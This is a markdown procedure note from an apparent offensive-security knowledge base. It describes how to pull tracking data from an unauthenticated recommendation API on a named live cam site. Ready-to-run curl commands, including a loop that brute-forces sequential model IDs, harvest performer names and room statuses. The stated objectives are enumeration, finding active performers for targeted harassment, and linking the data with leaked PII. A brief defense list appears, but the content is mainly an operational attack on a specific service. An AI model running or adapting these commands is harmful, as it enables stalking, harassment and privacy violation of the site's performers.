---
tags:
  - information-disclosure
  - tracking-leak
  - api
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-access-recommend-models-api]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:32:28.764Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 068068f5-573f-4a16-a5db-2da35aa1c5f2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
---

# Access-Recommend-Models-API-for-Tracking-Data

## Summary

This procedure targets the unauthenticated /api/models/recommend-models-to-cust.php endpoint on xvcams.com to extract internal tracking data like recommendation IDs, model IDs, room statuses, and session timestamps. It facilitates user activity monitoring and brute-force enumeration, useful for unauthorized tracking in privacy-invasive scenarios.

## Description

The endpoint responds to GET requests with parameters such as user_id (e.g., 0 for anonymous) and model_id, returning JSON without access controls. This exposes sensitive metadata, allowing attackers to infer user preferences or enumerate models. The lack of filtering enables parameter-based brute-forcing, contributing to broader data aggregation from the site. Requires only HTTP access; outcomes include JSON payloads ripe for scripting into larger harvesting tools.

## Requirements

1. Access to https://www.xvcams.com over HTTPS
2. HTTP client like curl or browser dev tools
3. Ability to vary parameters for enumeration

## Defense

Defensive measures and detection strategies:

- Enforce authentication for recommendation APIs (e.g., session tokens)
- Sanitize responses to remove internal IDs and room statuses
- Log and alert on requests with user_id=0 or sequential model_id probes
- Deploy API gateway with input validation to reject unauthenticated calls

## Objectives

1. Collect tracking data for model enumeration
2. Identify active/offline room statuses for targeted harassment
3. Enable correlation with other leaked PII

## Instructions

### Step 1: Anonymous Access with Default Parameters

**Context**: Test the endpoint anonymously to retrieve recommendation data without a valid user.

**Command** ([[commands/curl-access-recommend-models-api]]):
```bash
curl "https://www.xvcams.com/api/models/recommend-models-to-cust.php?user_id=0&model_id=1078906&t=$(date +%s)" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> Response includes recommId, model_id, model_name, room_status. Check for internal tracking fields; no auth required confirms vulnerability.

### Step 2: Brute-Force with Varying Model IDs

**Context**: Iterate model_id to expand data collection, simulating user tracking.

**Command** ([[commands/curl-access-recommend-models-api]]):
```bash
for id in {1078900..1078910}; do curl "https://www.xvcams.com/api/models/recommend-models-to-cust.php?user_id=0&model_id=$id&t=$(date +%s)" -H "User-Agent: Mozilla/5.0"; done
```

> This loops to fetch multiple entries. Output: Aggregated JSON showing patterns in room_status; use scripts to parse for active models.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-access-recommend-models-api]]

## Tools Used

- [[tools/Web-Browser]]

## Tags

- information-disclosure
- tracking-leak
- api

